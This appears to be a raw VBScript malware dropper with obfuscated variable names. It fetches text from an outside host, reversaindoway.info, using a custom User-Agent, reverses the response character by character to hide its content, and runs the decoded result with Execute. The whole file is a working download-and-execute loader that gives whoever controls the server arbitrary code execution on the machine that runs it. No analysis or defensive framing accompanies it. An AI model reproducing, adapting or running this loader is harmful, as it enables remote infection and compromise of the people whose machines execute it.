gaLvC="g43M8XGzA3LRRaN2TIrJNGCND"
URL="http://reversaindoway.info/?tgow=x5&" & gaLvC
set GnCyS=CreateObject("Microsoft.XMLHTTP")

GnCyS.open "GET",URL,false
GnCyS.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
GnCyS.setRequestHeader "User-Agent", "Joelton"
GnCyS.send "Z"

For i = Len(GnCyS.responsetext) to 1  Step-1
    var= Mid(GnCyS.responsetext,  i  , 1)
    GAiX8 = GAiX8 & var
Next

execute "Execute GAiX8 & gaLvCGnCyS"
